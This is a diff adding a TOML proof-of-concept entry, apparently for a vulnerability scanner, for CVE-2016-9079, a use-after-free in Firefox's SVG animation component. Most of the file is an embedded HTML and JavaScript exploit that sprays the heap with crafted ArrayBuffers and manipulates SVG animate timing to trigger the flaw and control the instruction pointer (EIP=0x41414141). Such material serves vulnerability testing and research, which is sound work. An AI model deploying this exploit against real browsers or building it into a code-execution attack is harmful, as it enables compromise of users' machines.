@@ -1,0 +1,95 @@
+[info]
+author = "AVE"
+description = "Mozilla Firefox 50.0.2之前版本SVG动画组件存在释放后重用漏洞(CVE-2016-9079)，通过特制SVG动画触发nsSMILTimeContainer::NotifyTimeChange()中的UAF。PoC基于RUB-SysSec/PrimGen公开PoC改编，安全触发EIP=0x41414141。"
+id = "POC-AVE-2016-0888"
+name = "Mozilla Firefox SVG Animation Use-After-Free PoC"
+severity = "high"
+tags = [
+    "cve-2016-9079",
+    "firefox",
+    "use-after-free",
+]
+vuln_id = [
+    "CVE-2016-9079",
+    "AVE-2016-0888",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<!DOCTYPE HTML>
+<html>
+<head><meta charset="utf-8"></head>
+<body>
+<script>
+var worker = new Worker('data:javascript,self.onmessage=function(msg){postMessage("one");postMessage("two");};');
+worker.postMessage("zero");
+var svgns = 'http://www.w3.org/2000/svg';
+var heap80 = new Array(0x1000);
+var heap100 = new Array(0x4000);
+var block80 = new ArrayBuffer(0x80);
+var block100 = new ArrayBuffer(0x100);
+var arrBase = undefined;
+var animateX = undefined;
+var containerA = undefined;
+var offset = 0x88;
+var exploit = function(){
+    var u32 = new Uint32Array(block80);
+    u32[0x4] = arrBase - offset;
+    u32[0xa] = arrBase - offset;
+    u32[0x10] = arrBase - offset;
+    u32[0] = 0xaabbccdd;
+    u32[1] = 0xaabbccee;
+    u32[0x11] = 0xaabbccff;
+    for(i = heap100.length/2; i < heap100.length; i++){ heap100[i] = block100.slice(0); }
+    for(i = 0; i < heap80.length/2; i++){ heap80[i] = block80.slice(0); }
+    animateX.setAttribute('begin', '59s');
+    animateX.setAttribute('begin', '58s');
+    for(i = heap80.length/2; i < heap80.length; i++){ heap80[i] = block80.slice(0); }
+    for(i = heap100.length/2; i < heap100.length; i++){ heap100[i] = block100.slice(0); }
+    animateX.setAttribute('begin', '10s');
+    animateX.setAttribute('begin', '9s');
+    containerA.pauseAnimations();
+};
+worker.onmessage = function(e){arrBase=0x30300000; exploit();};
+var trigger = function(){
+    containerA = document.createElementNS(svgns, 'svg');
+    var containerB = document.createElementNS(svgns, 'svg');
+    animateX = document.createElementNS(svgns, 'animate');
+    var animateA = document.createElementNS(svgns, 'animate');
+    var animateB = document.createElementNS(svgns, 'animate');
+    var animateC = document.createElementNS(svgns, 'animate');
+    var idA = "ia";
+    var idC = "ic";
+    animateA.setAttribute('id', idA);
+    animateA.setAttribute('end', '50s');
+    animateB.setAttribute('begin', '60s');
+    animateB.setAttribute('end', idC + '.end');
+    animateC.setAttribute('id', idC);
+    animateC.setAttribute('begin', idA + '.end');
+    containerA.appendChild(animateA);
+    containerA.appendChild(animateB);
+    containerA.appendChild(animateC);
+    containerB.appendChild(animateX);
+    containerA.appendChild(containerB);
+    document.body.appendChild(containerA);
+};
+window.onload = trigger;
+</script>
+<p>CVE-2016-9079 PoC</p>
+</body>
+</html>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["CVE-2016-9079 PoC"]
